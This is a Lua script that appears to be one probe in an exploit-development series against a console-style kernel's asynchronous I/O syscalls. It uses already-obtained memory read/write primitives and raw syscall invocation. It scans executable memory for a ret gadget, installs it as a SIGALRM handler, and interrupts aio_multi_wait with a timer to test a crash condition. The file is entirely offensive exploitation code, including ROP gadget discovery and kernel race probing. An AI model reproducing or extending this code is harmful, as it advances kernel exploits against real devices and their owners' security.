-- CRASH_CLASS: MODERATE
-- PROBE 789a: the smallest step that follows an interrupted wait
--
-- Context: 788a/788b interrupts aio_multi_wait with SIGALRM and the process
-- then dies in a way the system cannot reap ("Please wait" forever). This
-- probe stops immediately after the interrupted wait and exits, so the next
-- run can tell whether the interrupt alone is fatal or whether the later feed
-- (the wake path) is what kills it.
--
-- The watchdog stays armed across the wait and is disarmed right after.

print("=== PROBE 789a: INTERRUPT ONLY ===")
pcall(function() io.stdout:setvbuf("no") end)

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "string" then return #v == 1 and string.byte(v) or 0 end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local Z = uint64(0)
local function rd(a) return to_num(memory.read_dword(a)) end
local function wd(a, v) memory.write_dword(a, v) end
local function wq(a, v) memory.write_qword(a, v) end
local function hx(v) return string.format("%08X", to_num(v) % 4294967296) end
local function ascii(a, n)
    local s = {}
    for i = 0, n - 1 do
        local b = to_num(memory.read_byte(a + i))
        if b == 0 then break end
        s[#s + 1] = string.char(b)
    end
    return table.concat(s)
end

local SIGACTION, SETITIMER, CLOCK, SOCKETPAIR = 416, 83, 232, 135
local AIO_WAIT, AIO_POLL, AIO_SUBMIT = 663, 664, 669
local SIGALRM = 14

local ts = to_num(memory.alloc(0x40))
local sa = to_num(memory.alloc(0x40))
local sao = to_num(memory.alloc(0x40))
local itv = to_num(memory.alloc(0x40))
local sink = to_num(memory.alloc(0x4000))
local req = to_num(memory.alloc(0x200))
local ids = to_num(memory.alloc(0x100))
local states = to_num(memory.alloc(0x100))
local idout = to_num(memory.alloc(0x40))
local fds = to_num(memory.alloc(64))

local function clear(buf, n)
    for i = 0, n - 1 do wd(buf + i * 4, 0) end
end
local function now_ms()
    clear(ts, 16)
    make_syscall(CLOCK)(U(4), U(ts), Z)
    return rd(ts) * 1000 + math.floor(rd(ts + 8) / 1000000)
end

local STRIDE, MAX = 72, 512
local rbuf = to_num(memory.alloc(STRIDE * MAX + 0x100))
local countp = to_num(memory.alloc(16))
wq(countp, Z)
pcall(function() return make_syscall(674)(U(rbuf), U(STRIDE), U(MAX), U(countp), U(0x40000000), Z) end)
local count = rd(countp)
if count > MAX then count = MAX end
local exec_lo, exec_hi = nil, nil
for i = 0, count - 1 do
    local b = rbuf + i * STRIDE
    if (rd(b + 0x18) % 8) >= 4 then
        local lo = rd(b) + rd(b + 4) * 4294967296
        local hi = rd(b + 8) + rd(b + 12) * 4294967296
        if ascii(b + 0x20, 0x18):find("executable") and (exec_hi == nil or (hi - lo) > (exec_hi - exec_lo)) then
            exec_lo, exec_hi = lo, hi
        end
    end
end
if not exec_lo then print("[0] no executable region"); return end
local ret_gadget = nil
for off = 0, math.min(exec_hi - exec_lo - 4, 0x180000), 4 do
    local v = rd(exec_lo + off)
    if v % 256 == 0xC3 then ret_gadget = exec_lo + off; break end
    if math.floor(v / 256) % 256 == 0xC3 then ret_gadget = exec_lo + off + 1; break end
    if math.floor(v / 65536) % 256 == 0xC3 then ret_gadget = exec_lo + off + 2; break end
    if math.floor(v / 16777216) % 256 == 0xC3 then ret_gadget = exec_lo + off + 3; break end
end
if not ret_gadget then print("[0] no ret gadget"); return end
clear(sa, 32)
wq(sa, U(ret_gadget))
wd(sa + 8, 0)
local ar = sgn(make_syscall(SIGACTION)(U(SIGALRM), U(sa), U(sao)))
print(string.format("[0] ret=%08X sigaction=%d", ret_gadget, ar))
if ar ~= 0 then return end

local sr0 = sgn(make_syscall(SOCKETPAIR)(U(1), U(1), U(0), U(fds), Z, Z))
local rfd = rd(fds)
wq(req + 0x00, Z)
wq(req + 0x08, U(16))
wq(req + 0x10, U(sink))
wq(req + 0x18, U(sink + 0x2000))
wd(req + 0x20, rfd)
wd(req + 0x24, 0)
local sr = sgn(make_syscall(AIO_SUBMIT)(U(1), U(req), U(1), U(3), U(idout), Z))
local id = rd(idout)
wd(ids, id)
wd(states, 0xDEADBEEF)
sgn(make_syscall(AIO_POLL)(U(ids), U(1), U(states), Z, Z, Z))
print(string.format("[A] socketpair=%d submit=%d id=%s state=%s", sr0, sr, hx(id), hx(rd(states))))

clear(itv, 32); wq(itv + 16, U(2))
print(string.format("[B] arm=%d", sgn(make_syscall(SETITIMER)(U(0), U(itv), Z))))
wd(states, 0xDEADBEEF)
local t0 = now_ms()
local wr = sgn(make_syscall(AIO_WAIT)(U(ids), U(1), U(states), Z, Z, Z))
clear(itv, 32); sgn(make_syscall(SETITIMER)(U(0), U(itv), Z))
print(string.format("[B1] wait ret=%d elapsed=%dms state=%s", wr, now_ms() - t0, hx(rd(states))))

print("[C] exiting with the request still in flight")
sgn(make_syscall(SIGACTION)(U(SIGALRM), U(sao), Z))
print("=== PROBE 789a DONE ===")
